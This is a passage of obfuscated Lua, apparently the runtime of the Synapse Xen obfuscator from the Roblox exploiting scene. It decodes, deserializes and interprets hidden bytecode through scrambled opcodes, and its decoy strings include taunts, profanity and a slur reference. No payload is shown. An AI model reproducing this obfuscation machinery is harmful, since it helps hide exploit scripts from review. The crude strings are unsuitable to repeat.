                if b9 >= 256 then
                    b7 = {}
                    b9 = 1
                end
            end
            b7[aF(b8, b9)] = b6
            b8 = b8 + 1
            return b7, b8, b9
        end
        local function ba(bb)
            local function bc(bd)
                local b9 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
                bd = string.gsub(bd, "[^" .. b9 .. "=]", "")
                return bd:gsub(
                    ".",
                    function(aU)
                        if aU == "=" then
                            return ""
                        end
                        local be, bf = "", b9:find(aU) - 1
                        for aT = 6, 1, -1 do
                            be = be .. (bf % 2 ^ aT - bf % 2 ^ (aT - 1) > 0 and "1" or "0")
                        end
                        return be
                    end
                ):gsub(
                    "%d%d%d?%d?%d?%d?%d?%d?",
                    function(aU)
                        if #aU ~= 8 then
                            return ""
                        end
                        local bg = 0
                        for aT = 1, 8 do
                            bg = bg + (aU:sub(aT, aT) == "1" and 2 ^ (8 - aT) or 0)
                        end
                        return string.char(bg)
                    end
                )
            end
            bb = bc(bb)
            local bh = aE(bb, 1, 1)
            if bh == "u" then
                return aE(bb, 2)
            elseif bh ~= "c" then
                error(
                    "Synapse Xen - Failed to verify bytecode. Please make sure your Lua implementation supports non-null terminated strings."
                )
            end
            bb = aE(bb, 2)
            local bi = #bb
            local b7 = {}
            local b8, b9 = 0, 1
            local bj = {}
            local aO = 1
            local bk = aE(bb, 1, 2)
            bj[aO] = b2[bk] or b7[bk]
            aO = aO + 1
            for aT = 3, bi, 2 do
                local bl = aE(bb, aT, aT + 1)
                local bm = b2[bk] or b7[bk]
                if not bm then
                    error(
                        "Synapse Xen - Failed to verify bytecode. Please make sure your Lua implementation supports non-null terminated strings."
                    )
                end
                local bn = b2[bl] or b7[bl]
                if bn then
                    bj[aO] = bn
                    aO = aO + 1
                    b7, b8, b9 = b5(bm .. aE(bn, 1, 1), b7, b8, b9)
                else
                    local bo = bm .. aE(bm, 1, 1)
                    bj[aO] = bo
                    aO = aO + 1
                    b7, b8, b9 = b5(bo, b7, b8, b9)
                end
                bk = bl
            end
            return aH(bj)
        end
        local function bp(bq, br, bs)
            if bs then
                local bt = bq / 2 ^ (br - 1) % 2 ^ (bs - 1 - (br - 1) + 1)
                return bt - bt % 1
            else
                local bu = 2 ^ (br - 1)
                if bq % (bu + bu) >= bu then
                    return 1
                else
                    return 0
                end
            end
        end
        local function bv()
            local bw = aI(948499053, b0)
            while true do
                if bw == aI(1722825026, aZ[9]) then
                    a_ = function(bx, by)
                        return aI(bx + 2525, by + 27759) - aI(1489432889, b0)
                    end
                    bw = bw - aI(1489427607, b0)
                elseif bw == aI(1507155380, aZ[3]) then
                    a_ = function(bx, by)
                        return aI(bx + 38978, by - 49022) - aI(3481598539, aZ[3])
                    end
                    bw = bw - aI(885387313, aZ[5])
                elseif bw == aI(3528214834, b0) then
                    a_ = function(bx, by)
                        return aI(bx + 13684, by + 21142) - aI(762363465, aZ[6])
                    end
                    bw = aI(bw, aI(818994997, b0))
                elseif bw == aI(2223392262, b0) then
                    a_ = function(bx, by)
                        return aI(bx - 33161, by + 23651) + aI(1151701753, aZ[7])
                    end
                    bw = aI(bw, aI(3802810696, aZ[4]))
                elseif bw == aI(62484179, b0) then
                    return
                elseif bw == aI(4185132050, aZ[9]) then
                    a_ = function(bx, by)
                        return aI(bx + 13389, by - 161) + aI(1151717849, aZ[7])
                    end
                    bw = aI(bw, aI(1854946543, aZ[9]))
                elseif bw == aI(4020232363, b0) then
                    a_ = function(bx, by)
                        return aI(bx + 8823, by - 14297) - aI(1489393683, b0)
                    end
                    bw = aI(bw, aI(152456967, aZ[5]))
                elseif bw == aI(188071600, aZ[2]) then
                    a_ = function(bx, by)
                        return aI(bx + 5100, by + 43027) + aI(1120999605, aZ[1])
                    end
                    bw = aI(bw, aI(201143353, aZ[9]))
                elseif bw == aI(3126509415, b0) then
                    a_ = function(bx, by)
                        return aI(bx - 27456, by - 21639) - aI(1489409738, b0)
                    end
                    bw = aI(bw, aI(1712991321, b0))
                elseif bw == aI(3475170757, b0) then
                    a_ = function(bx, by)
                        return aI(bx + 8824, by + 45307) + aI(1489418935, b0)
                    end
                    bw = aI(bw, aI(231598808, aZ[6]))
                elseif bw == aI(4020212007, b0) then
                    a_ = function(bx, by)
                        return aI(bx - 47493, by - 30986) - aI(1489400472, b0)
                    end
                    bw = bw - aI(157665566, aZ[9])
                elseif bw == aI(83223264, aZ[8]) then
                    a_ = function(bx, by)
                        return aI(bx - 22583, by + 27169) + aI(1489413756, b0)
                    end
                    bw = bw + aI(1121018301, aZ[1])
                elseif bw == aI(3126477631, b0) then
                    a_ = function(bx, by)
                        return aI(bx - 28499, by + 38159) - aI(1489429565, b0)
                    end
                    bw = bw - aI(1489436304, b0)
                elseif bw == aI(1295972559, aZ[6]) then
                    a_ = function(bx, by)
                        return aI(bx - 26925, by + 37716) - aI(4189853307, aZ[2])
                    end
                    bw = aI(bw, aI(2933467880, b0))
                elseif bw == aI(541271947, aZ[2]) then
                    a_ = function(bx, by)
                        return aI(bx + 38654, by - 36071) + aI(1690011561, aZ[8])
                    end
                    bw = aI(bw, aI(2196748638, aZ[5]))
                elseif bw == aI(1900345616, aZ[4]) then
                    a_ = function(bx, by)
                        return aI(bx - 37790, by - 29332) + aI(1489422313, b0)
                    end
                    bw = aI(bw, aI(1008627557, b0))
                elseif bw == aI(924000281, b0) then
                    a_ = function(bx, by)
                        return aI(bx - 14238, by + 29112) - aI(157639265, aZ[9])
                    end
                    bw = aI(bw, aI(3440822353, aZ[2]))
                end
            end
        end
        local function bz(bA)
            local bB = 1
            local bC
            local bD
            local function bE()
                local bF = aD(bA, bB, bB)
                bB = bB + 1
                return bF
            end
            local function bG()
                local bH, bx, by, bI = aD(bA, bB, bB + 3)
                bB = bB + 4
                return bI * 16777216 + by * 65536 + bx * 256 + bH
            end
            local function bJ()
                return bG() * 4294967296 + bG()
            end
            local function bK()
                local bL =
                    aJ(
                    bG(),
                    aY[787895832] or
                        (function(...)
                            local aU = "hi xen doesn't work on sk8r please help"
                            local bM = a_(3061007304, 1741223754)
                            local bN = {...}
                            for aT, bO in pairs(bN) do
                                local bP
                                local bQ = type(bO)
                                if bQ == "number" then
                                    bP = bO
                                elseif bQ == "string" then
                                    bP = bO:len()
                                elseif bQ == "table" then
                                    bP = a_(1582046332, 1581968161)
                                end
                                bM = bM - bP
                            end
                            aY[787895832] =
                                aI(aI(3753651827, bM), aI(3214545546, b0)) - string.len(aU) -
                                #{2702742239, 3041158202, 606931409, 4176372461, 1523382807, 2280370136, 4289641407}
                            return aY[787895832]
                        end)(12548, {}, 6324, {}, "IiiilillIIli", "liilIIiiliIlilIiiII")
                )
                local bR =
                    aJ(
                    bG(),
                    aY[2348464230] or
                        (function()
                            local aU = "luraph better then xen bros :pensive:"
                            aY[2348464230] =
                                aI(a_(3954658289, 1394759650), aI(817683258, b0)) - string.len(aU) -
                                #{838170403, 2782247076, 613397913, 2622804637, 2940441189, 1724492454}
                            return aY[2348464230]
                        end)()
                )
                local bS = 1
                local bT = bp(bR, 1, 20) * 2 ^ 32 + bL
                local bU = bp(bR, 21, 31)
                local bV = (-1) ^ bp(bR, 32)
                if bU == 0 then
                    if bT == 0 then
                        return bV * 0
                    else
                        bU = 1
                        bS = 0
                    end
                elseif bU == 2047 then
                    if bT == 0 then
                        return bV * 1 / 0
                    else
                        return bV * 0 / 0
                    end
                end
                return math.ldexp(bV, bU - 1023) * (bS + bT / 2 ^ 52)
            end
            local function bW(bX)
                local bY
                if bX then
                    bY = aE(bA, bB, bB + bX - 1)
                    bB = bB + bX
                else
                    bX = bC()
                    if bX == 0 then
                        return ""
                    end
                    bY = aE(bA, bB, bB + bX - 1)
                    bB = bB + bX
                end
                return bY
            end
            local function bZ(bY)
                local bt = {}
                for aT = 1, #bY do
                    local b_ = bY:sub(aT, aT)
                    bt[#bt + 1] =
                        string.char(
                        aI(
                            string.byte(b_),
                            aY[2620698295] or
                                (function(...)
                                    local aU = "epic gamer vision"
                                    local bM = a_(1491855899, 1718803045)
                                    local bN = {...}
                                    for aT, bO in pairs(bN) do
                                        local bP
                                        local bQ = type(bO)
                                        if bQ == "number" then
                                            bP = bO
                                        elseif bQ == "string" then
                                            bP = bO:len()
                                        elseif bQ == "table" then
                                            bP = a_(2403988998, 2403900120)
                                        end
                                        bM = bM - bP
                                    end
                                    aY[2620698295] =
                                        aI(aI(2276299288, bM), aI(3791424421, b0)) - string.len(aU) -
                                        #{
                                            3764561786,
                                            599292526,
                                            1227465097,
                                            1908931841,
                                            564488769,
                                            967347481,
                                            3455526171
                                        }
                                    return aY[2620698295]
                                end)({}, 3057, {}, "Illli", {}, 12827, {}, "llIliIliiii", 6638, "llIIi")
                        )
                    )
                end
                return table.concat(bt)
            end
            local function c0()
                local c1 = {}
                local c2 = {}
                local c3 = {}
                local c4 = {
                    [aY[2455613203] or
                        (function()
                            local aU = "imagine using some lua minifier tool and thinking you are a badass"
                            aY[2455613203] =
                                aI(a_(3934342561, 2185309124), aI(2571056052, aZ[2])) - string.len(aU) -
                                #{3712531900, 3595152101, 1712847732}
                            return aY[2455613203]
                        end)()] = c3,
                    [aY[2224970540] or
                        (function(...)
                            local aU =
                                "what are you trying to say? that fucking one dot + dot + dot + many dots is not adding adding 1 dot + dot and then adding all the dots together????"
                            local bM = a_(4261763878, 2217473212)
                            local bN = {...}
                            for aT, bO in pairs(bN) do
                                local bP
                                local bQ = type(bO)
                                if bQ == "number" then
                                    bP = bO
                                elseif bQ == "string" then
                                    bP = bO:len()
                                elseif bQ == "table" then
                                    bP = a_(3525695956, 3525642820)
                                end
                                bM = bM - bP
                            end
                            aY[2224970540] =
                                aI(aI(4105547274, bM), aI(3431756450, aZ[6])) - string.len(aU) -
                                #{3469583340, 3731207578, 1619900954, 638615773, 385246642}
                            return aY[2224970540]
                        end)(10753)] = c2,
                    [aY[785216252] or
                        (function()
                            local aU = "print(bytecode)"
                            aY[785216252] =
                                aI(a_(3587564239, 3421290582), aI(1995851934, b0)) - string.len(aU) -
                                #{2222864998, 3344017211, 907349358, 97649702, 2099882113, 4220481397, 2095622251}
                            return aY[785216252]
                        end)()] = c1
                }
                for c5 = 1, aI(
                    bD(),
                    aY[3914828257] or
                        (function()
                            local aU = "xen detects custom getfenv"
                            aY[3914828257] =
                                aI(a_(2612862976, 3543866048), aI(729261275, aZ[3])) - string.len(aU) -
                                #{4077329039, 3191235910}
                            return aY[3914828257]
                        end)()
                ) do
                    bG()
                    local c6 =
                        aI(
                        bG(),
                        aY[2596180195] or
                            (function()
                                local aU = "now with shitty xor string obfuscation"
                                aY[2596180195] =
                                    aI(a_(576032272, 4188068794), aI(4168816855, b0)) - string.len(aU) -
                                    #{
                                        2794177540,
                                        2203495395,
                                        3435578145,
                                        583153670,
                                        69487391,
                                        2115182631,
                                        1729266026,
                                        946683116
                                    }
                                return aY[2596180195]
                            end)()
                    )
                    local c7 = bE()
                    local aG = bE()
                    bE()
                    local c8 = {
                        [1368095180] = c6,
                        [889969899] = c7,
                        [794972133] = bp(c6, 1, 6),
                        [662764126] = bp(c6, 7, 14)
                    }
                    if
                        aG ==
                            (aY[273448869] or
                                (function(...)
                                    local aU = "hi my 2.5mb script doesn't work with xen please help"
                                    local bM = a_(1151573613, 2949993075)
                                    local bN = {...}
                                    for aT, bO in pairs(bN) do
                                        local bP
                                        local bQ = type(bO)
                                        if bQ == "number" then
                                            bP = bO
                                        elseif bQ == "string" then
                                            bP = bO:len()
                                        elseif bQ == "table" then
                                            bP = a_(1597873335, 1597850935)
                                        end
                                        bM = bM - bP
                                    end
                                    aY[273448869] =
                                        aI(aI(2958671540, bM), aI(65730634, b0)) - string.len(aU) -
                                        #{
                                            2007998335,
                                            2902421900,
                                            1760310837,
                                            755501000,
                                            4198517683,
                                            3328212420,
                                            2190114464,
                                            4242060740
                                        }
                                    return aY[273448869]
                                end)(3521, {}, {}))
                     then
                        c8[1448336135] = bp(c6, 24, 32)
                        c8[944577840] = bp(c6, 15, 23)
                    elseif
                        aG ==
                            (aY[2278644228] or
                                (function(...)
                                    local aU = "xen doesn't come with instance caching, sorry superskater"
                                    local bM = a_(3991139080, 1364051756)
                                    local bN = {...}
                                    for aT, bO in pairs(bN) do
                                        local bP
                                        local bQ = type(bO)
                                        if bQ == "number" then
                                            bP = bO
                                        elseif bQ == "string" then
                                            bP = bO:len()
                                        elseif bQ == "table" then
                                            bP = a_(563696958, 563702457)
                                        end
                                        bM = bM - bP
                                    end
                                    aY[2278644228] =
                                        aI(aI(2603316402, bM), aI(2134971208, b0)) - string.len(aU) -
                                        #{
                                            2908259246,
                                            977656398,
                                            1359903029,
                                            1030795709,
                                            681485378,
                                            1112373434,
                                            3943886652
                                        }
                                    return aY[2278644228]
                                end)("iiIIIlilIlilIIliIIl", "lIllIiIillliIIl", 954, {}, 2562))
                     then
                        c8[1588048608] = bp(c6, 15, 32)
                    elseif
                        aG ==
                            (aY[3995469679] or
                                (function()
                                    local aU = "thats how mafia works"
                                    aY[3995469679] =
                                        aI(a_(2969270281, 3669563045), aI(847574923, b0)) - string.len(aU) -
                                        #{4052679470, 3290017380, 3144833740, 128233801}
                                    return aY[3995469679]
                                end)())
                     then
                        c8[1457547185] = bp(c6, 15, 32) - 131071
                    end
                    c3[c5] = c8
                end
                c4[1639588650] =
                    aI(
                    bE(),
                    aY[1171540220] or
                        (function(...)
                            local aU = "wally bad bird"
                            local bM = a_(3481654925, 2174564264)
                            local bN = {...}
                            for aT, bO in pairs(bN) do
                                local bP
                                local bQ = type(bO)
                                if bQ == "number" then
                                    bP = bO
                                elseif bQ == "string" then
                                    bP = bO:len()
                                elseif bQ == "table" then
                                    bP = a_(1399190846, 1399099321)
                                end
                                bM = bM + bP
                            end
                            aY[1171540220] =
                                aI(aI(3867637770, bM), aI(4032181268, b0)) - string.len(aU) -
                                #{
                                    2474375437,
                                    81463546,
                                    2143468367,
                                    3840896817,
                                    1297838519,
                                    1972384841,
                                    3426678363,
                                    1659939025,
                                    1766091421
                                }
                            return aY[1171540220]
                        end)("liiilIllIl", "lliIIiiiilli", 2071)
                )
                bG()
                c4[115077684] =
                    aI(
                    bE(),
                    aY[265286695] or
                        (function()
                            local aU =
                                "i'm intercommunication about the most nonecclesiastical dll exploits for esp. they only characterization objects with a antepatriarchal in the geistesgeschichte for the esp."
                            aY[265286695] =
                                aI(a_(1844943247, 1617266439), aI(3934554428, aZ[4])) - string.len(aU) -
                                #{1946672385, 2594561860, 671743245, 2650578491, 4276251803}
                            return aY[265286695]
                        end)()
                )
                bE()
                bG()
                bE()
                for c5 = 1, aI(
                    bD(),
                    aY[966198500] or
                        (function()
                            local aU = "skisploit is the superior obfuscator, clearly."
                            aY[966198500] =
                                aI(a_(2949723038, 3424853919), aI(1094419526, b0)) - string.len(aU) -
                                #{
                                    3889150766,
                                    2509057967,
                                    838730384,
                                    184280126,
                                    2934522129,
                                    1745064943,
                                    133500083,
                                    3726147092,
                                    2577465809
                                }
                            return aY[966198500]
                        end)()
                ) do
                    local aG = bE()
                    local c9
                    if
                        aG ==
                            (aY[2646460463] or
                                (function()
                                    local aU =
                                        "my way to go against expwoiting is to have safety measuwes. i 1 wocawscwipt and onwy moduwes. hewe's how it wowks: this scwipt bewow stowes the moduwes in a tabwe fow each moduwe we send the wist with the moduwes and moduwe infowmation and use inyit a function in my moduwe that wiww stowe the info and aftew it has send to aww the moduwes it wiww dewete them. so whenyevew the cwient twies to hack they cant get the moduwes. onwy this peace of wocawscwipt."
                                    aY[2646460463] =
                                        aI(a_(41106988, 4119329147), aI(2939949157, b0)) - string.len(aU) -
                                        #{4202079559, 1327618135, 1494848269, 2198639201}
                                    return aY[2646460463]
                                end)())
                     then
                        c9 = bE() ~= 0
                    elseif
                        aG ==
                            (aY[4028787490] or
                                (function(...)
                                    local aU = "hi devforum"
                                    local bM = a_(61466143, 2009561463)
                                    local bN = {...}
                                    for aT, bO in pairs(bN) do
                                        local bP
                                        local bQ = type(bO)
                                        if bQ == "number" then
                                            bP = bO
                                        elseif bQ == "string" then
                                            bP = bO:len()
                                        elseif bQ == "table" then
                                            bP = a_(1676954044, 1676955872)
                                        end
                                        bM = bM + bP
                                    end
                                    aY[4028787490] =
                                        aI(aI(1276177457, bM), aI(1622908535, b0)) - string.len(aU) -
                                        #{
                                            2297490931,
                                            1109356098,
                                            3821726687,
                                            516057266,
                                            1137751604,
                                            2424002035,
                                            1425154080
                                        }
                                    return aY[4028787490]
                                end)(1611, "liiillIIiIiiIIlli", 256))
                     then
                        c9 = bK()
                    elseif
                        aG ==
                            (aY[2604904329] or
                                (function(...)
                                    local aU = "now comes with a free n word pass"
                                    local bM = a_(3697393390, 1840649553)
                                    local bN = {...}
                                    for aT, bO in pairs(bN) do
                                        local bP
                                        local bQ = type(bO)
                                        if bQ == "number" then
                                            bP = bO
                                        elseif bQ == "string" then
                                            bP = bO:len()
                                        elseif bQ == "table" then
                                            bP = a_(3240995816, 3240971589)
                                        end
                                        bM = bM - bP
                                    end
                                    aY[2604904329] =
                                        aI(aI(3274091112, bM), aI(708213835, b0)) - string.len(aU) -
                                        #{
                                            3331855040,
                                            1637354359,
                                            1250429079,
                                            895746188,
                                            4261963875,
                                            1721090240,
                                            593285370
                                        }
                                    return aY[2604904329]
                                end)(8376, {}, 4831))
                     then
                        c9 = aE(bZ(bW()), 1, -2)
                    end
                    c2[c5 - 1] = c9
                end
                bG()
                for c5 = 1, aI(
                    bD(),
                    aY[1171966229] or
                        (function()
                            local aU =
                                "so if you'we nyot awawe of expwoiting by this point, you've pwobabwy been wiving undew a wock that the pionyeews used to wide fow miwes. wobwox is often seen as an expwoit-infested gwound by most fwom the suwface, awthough this isn't the case."
                            aY[1171966229] =
                                aI(a_(392073153, 360599991), aI(2911436567, aZ[1])) - string.len(aU) -
                                #{1073587410, 1156765933, 1485130149, 2166540325, 937624543, 1580534624}
                            return aY[1171966229]
                        end)()
                ) do
                    c1[c5 - 1] = c0()
                end
                return c4
            end
            do
                assert(
                    bW(4) == "\27Xen",
                    "Synapse Xen - Failed to verify bytecode. Please make sure your Lua implementation supports non-null terminated strings."
                )
                bD = bG
                bC = bG
                local ca = bW()
                bE()
                b0 = aX(bD())
                bE()
                local cb = 0
                for aT = 1, #ca do
                    local b_ = ca:sub(aT, aT)
                    cb = cb + string.byte(b_)
                end
                cb = aI(cb, b0)
                for c5 = 1, bE() do
                    aZ[c5] = aJ(bD(), cb)
                end
                bv()
            end
            return c0()
        end
        local function cc(...)
            return aC("#", ...), {...}
        end
        local function cd(c4, ce, cf)
            local c3 =
                c4[
                aY[2455613203] or
                    (function()
                        local aU = "imagine using some lua minifier tool and thinking you are a badass"
                        aY[2455613203] =
                            aI(a_(3934342561, 2185309124), aI(2571056052, aZ[2])) - string.len(aU) -
                            #{3712531900, 3595152101, 1712847732}
                        return aY[2455613203]
                    end)()
            ]
            local c1 =
                c4[
                aY[785216252] or
                    (function()
                        local aU = "print(bytecode)"
                        aY[785216252] =
                            aI(a_(3587564239, 3421290582), aI(1995851934, b0)) - string.len(aU) -
                            #{2222864998, 3344017211, 907349358, 97649702, 2099882113, 4220481397, 2095622251}
                        return aY[785216252]
                    end)()
            ]
            local c2 =
                c4[
                aY[2224970540] or
                    (function(...)
                        local aU =
                            "what are you trying to say? that fucking one dot + dot + dot + many dots is not adding adding 1 dot + dot and then adding all the dots together????"
                        local bM = a_(4261763878, 2217473212)
                        local bN = {...}
                        for aT, bO in pairs(bN) do
                            local bP
                            local bQ = type(bO)
                            if bQ == "number" then
                                bP = bO
                            elseif bQ == "string" then
                                bP = bO:len()
                            elseif bQ == "table" then
                                bP = a_(3525695956, 3525642820)
                            end
                            bM = bM - bP
                        end
                        aY[2224970540] =
                            aI(aI(4105547274, bM), aI(3431756450, aZ[6])) - string.len(aU) -
                            #{3469583340, 3731207578, 1619900954, 638615773, 385246642}
                        return aY[2224970540]
                    end)(10753)
            ]
            return function(...)
                local cg, ch = 1, -1
                local ci, cj = {}, aC("#", ...) - 1
                local ck = 0
                local cl = {}
                local cm = {}
                local cn =
                    setmetatable(
                    {},
                    {__index = cl, __newindex = function(co, cp, cq)
                            if cp > ch then
                                ch = cp
                            end
                            cl[cp] = cq
                        end}
                )
                local function cr()
                    local c8, cs
                    while true do
                        c8 = c3[cg]
                        cs = c8[889969899]
                        cg = cg + 1
                        if cs == 77 then
                            local ct = aI(c8[662764126], 60)
                            local cu = aL(c8[1448336135], 96, 512)
                            local b_ = aI(c8[944577840], 6)
                            local cv = cn
                            cu = cv[cu]
                            if b_ > 255 then
                                b_ = c2[b_ - 256]
                            else
                                b_ = cv[b_]
                            end
                            cv[ct + 1] = cu
                            cv[ct] = cu[b_]
                        elseif cs == 133 then
                            cn[aK(c8[662764126], 124, 256)] = aI(c8[1448336135], 75) ~= 0
                            if aI(c8[944577840], 38) ~= 0 then
                                cg = cg + 1
                            end
                        elseif cs == 14 then
                            cf[aK(aI(c8[1448336135], 14), ck, 512)] = cn[aI(c8[662764126], 63)]
                        elseif cs == 63 then
                            cn[aI(c8[662764126], 2)] = cf[aI(c8[1448336135], 69)]
                        elseif cs == 42 then
                            local ct = aL(aK(c8[662764126], 81, 256), ck, 256) ~= 0
                            local cu = aI(aK(c8[1448336135], 64, 512), ck)
                            local b_ = aI(c8[944577840], 83)
                            local cv = cn
                            if cu > 255 then
                                cu = c2[cu - 256]
                            else
                                cu = cv[cu]
                            end
                            if b_ > 255 then
                                b_ = c2[b_ - 256]
                            else
                                b_ = cv[b_]
                            end
                            if cu <= b_ ~= ct then
                                cg = cg + 1
                            end
                        elseif cs == 119 then
                            local cu = aL(c8[1448336135], 16, 512)
                            local b_ = aI(c8[944577840], 99)
                            local cv = cn
                            if cu > 255 then
                                cu = c2[cu - 256]
                            else
                                cu = cv[cu]
                            end
                            if b_ > 255 then
                                b_ = c2[b_ - 256]
                            else
                                b_ = cv[b_]
                            end
                            cv[aK(c8[662764126], 3, 256)] = cu % b_
                        elseif cs == 78 then
                            cn[aK(c8[662764126], 40, 256)] = not cn[aL(c8[1448336135], 64, 512)]
                        elseif cs == 47 then
                            local cu = aL(c8[1448336135], 29, 512)
                            local b_ = aK(c8[944577840], 61, 512)
                            local cv = cn
                            if cu > 255 then
                                cu = c2[cu - 256]
                            else
                                cu = cv[cu]
                            end
                            if b_ > 255 then
                                b_ = c2[b_ - 256]
                            else
                                b_ = cv[b_]
                            end
                            cv[aK(c8[662764126], 42, 256)] = cu * b_
                        elseif cs == 6 then
                            local cu = aI(c8[1448336135], 97)
                            local b_ = aL(c8[944577840], 75, 512)
                            local cv = cn
                            if cu > 255 then
                                cu = c2[cu - 256]
                            else
                                cu = cv[cu]
                            end
                            if b_ > 255 then
                                b_ = c2[b_ - 256]
                            else
                                b_ = cv[b_]
                            end
                            cv[aI(c8[662764126], 124)] = cu / b_
                        elseif cs == 8 then
                            local cu = aL(c8[1448336135], 70, 512)
                            local b_ = aL(c8[944577840], 5, 512)
                            local cv = cn
                            if cu > 255 then
                                cu = c2[cu - 256]
                            else
                                cu = cv[cu]
                            end
                            if b_ > 255 then
                                b_ = c2[b_ - 256]
                            else
                                b_ = cv[b_]
                            end
                            cv[aI(c8[662764126], 77)] = cu + b_
                        elseif cs == 68 then
                            cn[aK(c8[662764126], 71, 256)] = -cn[aI(c8[1448336135], 73)]
                        elseif cs == 196 then
                            local ct = aK(c8[662764126], 82, 256) ~= 0
                            local cu = aL(c8[1448336135], 80, 512)
                            local b_ = aL(aK(c8[944577840], 4, 512), ck, 512)
                            local cv = cn
                            if cu > 255 then
                                cu = c2[cu - 256]
                            else
                                cu = cv[cu]
                            end
                            if b_ > 255 then
                                b_ = c2[b_ - 256]
                            else
                                b_ = cv[b_]
                            end
                            if cu < b_ ~= ct then
                                cg = cg + 1
                            end
                        elseif cs == 71 then
                            local ct = aK(c8[662764126], 73, 256) ~= 0
                            local cu = aK(c8[1448336135], 86, 512)
                            local b_ = aK(c8[944577840], 51, 512)
                            local cv = cn
                            if cu > 255 then
                                cu = c2[cu - 256]
                            else
                                cu = cv[cu]
                            end
                            if b_ > 255 then
                                b_ = c2[b_ - 256]
                            else
                                b_ = cv[b_]
                            end
                            if cu == b_ ~= ct then
                                cg = cg + 1
                            end
                        elseif cs == 74 then
                            cg = cg + c8[1457547185]
                        elseif cs == 52 then
                            local cu = cn[aI(c8[1448336135], 4)]
                            if not (not cu) == (aI(c8[944577840], 17) == 0) then
                                cg = cg + 1
                            else
                                cn[aI(c8[662764126], 127)] = cu
                            end
                        elseif cs == 232 then
                            ck = cn[aL(c8[662764126], 99, 256)]
                        elseif cs == 90 then
                            local b_ = aL(aK(c8[944577840], 18, 512), ck, 512)
                            local cv = cn
                            if b_ > 255 then
                                b_ = c2[b_ - 256]
                            else
                                b_ = cv[b_]
                            end
                            cv[aL(c8[662764126], 117, 256)] = cv[aI(c8[1448336135], 72)][b_]
                        elseif cs == 13 then
                            cn[aK(c8[662764126], 79, 256)] = #cn[aK(aL(c8[1448336135], 107, 512), ck, 512)]
                        elseif cs == 141 then
                            cn[aI(c8[662764126], 123)] = cn[aI(c8[1448336135], 44)]
                        elseif cs == 233 then
                            local cu = aI(aL(c8[1448336135], 77, 512), ck)
                            local b_ = aL(aI(c8[944577840], 85), ck, 512)
                            local cv = cn
                            if cu > 255 then
                                cu = c2[cu - 256]
                            else
                                cu = cv[cu]
                            end
                            if b_ > 255 then
                                b_ = c2[b_ - 256]
                            else
                                b_ = cv[b_]
                            end
                            cv[aL(c8[662764126], 82, 256)] = cu ^ b_
                        elseif cs == 103 then
                            local ct = aI(aK(c8[662764126], 21, 256), ck)
                            local cu = aL(c8[1448336135], 64, 512)
                            local cv, cw = cn, ci
                            ch = ct - 1
                            for c5 = ct, ct + (cu > 0 and cu - 1 or cj) do
                                cv[c5] = cw[c5 - ct]
                            end
                        elseif cs == 158 then
                            local cx = c1[aK(aI(c8[1588048608], 205748), ck, 262144)]
                            local cv = cn
                            local cy
                            local cz
                            if cx[1639588650] ~= 0 then
                                cy = {}
                                cz =
                                    setmetatable(
                                    {},
                                    {__index = function(co, cp)
                                            local cA = cy[cp]
                                            return cA[1][cA[2]]
                                        end, __newindex = function(co, cp, cq)
                                            local cA = cy[cp]
                                            cA[1][cA[2]] = cq
                                        end}
                                )
                                for c5 = 1, cx[1639588650] do
                                    local cB = c3[cg]
                                    if cB[889969899] == 141 then
                                        cy[c5 - 1] = {cv, aI(cB[1448336135], 44)}
                                    elseif cB[889969899] == 63 then
                                        cy[c5 - 1] = {cf, aI(cB[1448336135], 69)}
                                    end
                                    cg = cg + 1
                                end
                                cm[#cm + 1] = cy
                            end
                            cv[aL(c8[662764126], 114, 256)] = cd(cx, ce, cz)
                        elseif cs == 177 then
                            cn[aI(aI(c8[662764126], 26), ck)] = ce[c2[aK(aI(c8[1588048608], 204599), ck, 262144)]]
                        elseif cs == 239 then
                            local ct = aK(c8[662764126], 105, 256)
                            local cu = aI(aL(c8[1448336135], 60, 512), ck)
                            local cv = cn
                            local cC, cD
                            local cE
                            if cu == 1 then
                                return
                            elseif cu == 0 then
                                cE = ch
                            else
                                cE = ct + cu - 2
                            end
                            cD = {}
                            cC = 0
                            for c5 = ct, cE do
                                cC = cC + 1
                                cD[cC] = cv[c5]
                            end
                            return cD, cC
                        elseif cs == 15 then
                            local ct = aL(c8[662764126], 8, 256)
                            local cF = {}
                            for c5 = 1, #cm do
                                local cG = cm[c5]
                                for cH = 0, #cG do
                                    local cI = cG[cH]
                                    local cv = cI[1]
                                    local bB = cI[2]
                                    if cv == cn and bB >= ct then
                                        cF[bB] = cv[bB]
                                        cI[1] = cF
                                    end
                                end
                            end
                        elseif cs == 22 then
                            cn[aI(c8[662764126], 83)] = {}
                        elseif cs == 225 then
                            local ct = aK(c8[662764126], 76, 256)
                            local b_ = aI(aL(c8[944577840], 80, 512), ck)
                            local cv = cn
                            local cJ = ct + 2
                            local cK = {cv[ct](cv[ct + 1], cv[ct + 2])}
                            for c5 = 1, b_ do
                                cn[cJ + c5] = cK[c5]
                            end
                            if cv[ct + 3] ~= nil then
                                cv[ct + 2] = cv[ct + 3]
                            else
                                cg = cg + 1
                            end
                        elseif cs == 137 then
                            local ct = aK(c8[662764126], 123, 256)
                            local cv = cn
                            local cL = cv[ct + 2]
                            local cM = cv[ct] + cL
                            cv[ct] = cM
                            if cL > 0 then
                                if cM <= cv[ct + 1] then
                                    cg = cg + c8[1457547185]
                                    cv[ct + 3] = cM
                                end
                            else
                                if cM >= cv[ct + 1] then
                                    cg = cg + c8[1457547185]
                                    cv[ct + 3] = cM
                                end
                            end
                        elseif cs == 135 then
                            local cu, b_ = aI(c8[1448336135], 50), aK(aI(c8[944577840], 50), ck, 512)
                            local cv = cn
                            if cu > 255 then
                                cu = c2[cu - 256]
                            else
                                cu = cv[cu]
                            end
                            if b_ > 255 then
                                b_ = c2[b_ - 256]
                            else
                                b_ = cv[b_]
                            end
                            cv[aI(aL(c8[662764126], 20, 256), ck)][cu] = b_
                        elseif cs == 43 then
                            local cv = cn
                            for c5 = aL(c8[662764126], 13, 256), aK(c8[1448336135], 38, 512) do
                                cv[c5] = nil
                            end
                        elseif cs == 31 then
                            local ct = aI(c8[662764126], 47)
                            local cu = aK(aK(c8[1448336135], 4, 512), ck, 512)
                            local b_ = aL(c8[944577840], 125, 512)
                            local cv = cn
                            if b_ == 0 then
                                cg = cg + 1
                                b_ = c3[cg][1368095180]
                            end
                            local cJ = (b_ - 1) * 50
                            local cN = cv[ct]
                            if cu == 0 then
                                cu = ch - ct
                            end
                            for c5 = 1, cu do
                                cN[cJ + c5] = cv[ct + c5]
                            end
                        elseif cs == 33 then
                            local ct = aI(c8[662764126], 26)
